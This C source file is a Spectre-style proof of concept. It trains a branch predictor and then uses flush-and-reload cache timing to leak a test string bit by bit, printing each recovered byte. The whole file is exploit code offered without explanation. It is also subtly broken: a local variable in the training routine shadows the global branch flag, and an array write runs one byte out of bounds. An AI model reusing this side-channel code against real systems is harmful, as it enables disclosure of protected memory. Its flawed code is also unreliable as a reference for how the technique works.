

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include "../fr.h"
char buf[4096];
bool take = true;
#define THRESHOLD 300
#define TRAIN_SIZE 3000



char* secret = "spectre test";
void branch(char* a, int j)
{
    if (take)
    {
        if (*a & (1 << j))
        {
            buf[0] = 1;
        }
    }
    
}



void train()
{
    char a = 1;
    bool take = true;
    for (int i = 0; i < TRAIN_SIZE; i++)
    {
        flush(&take);
        branch(&a, 0);
        flush(&take);
    }
    take = false;
    flush(&take);
}


char spectre_read(char* secret, int offset)
{
    char c = 0x0;
    for (int j = 0; j < 8; j++)
    {
        train();
        flush(&buf[0]);
        branch(secret + offset, j);
        unsigned long timing;
        if ((timing = probe_timing(&buf[0])) < THRESHOLD)
        {
            c |= (1<<j);
        }
    }
    return c;
}



int main(int argc, char** argv)
{
    
    


    char found_secret[strlen(secret)];
    found_secret[strlen(secret)] = 0;
    memset(found_secret, 0x0, strlen(secret));


    for (int i = 0; i < strlen(secret); i++)
    {
        char c1 = 0x0;
        char c2 = 0x0;
        while((c1 = spectre_read(secret, i)) > 150 || c1 < 31);


        found_secret[i] = c1;
        printf("Found Secret: %s\n", found_secret);
    }
    printf("Found Secret: %s\n", found_secret);

    return 0;
}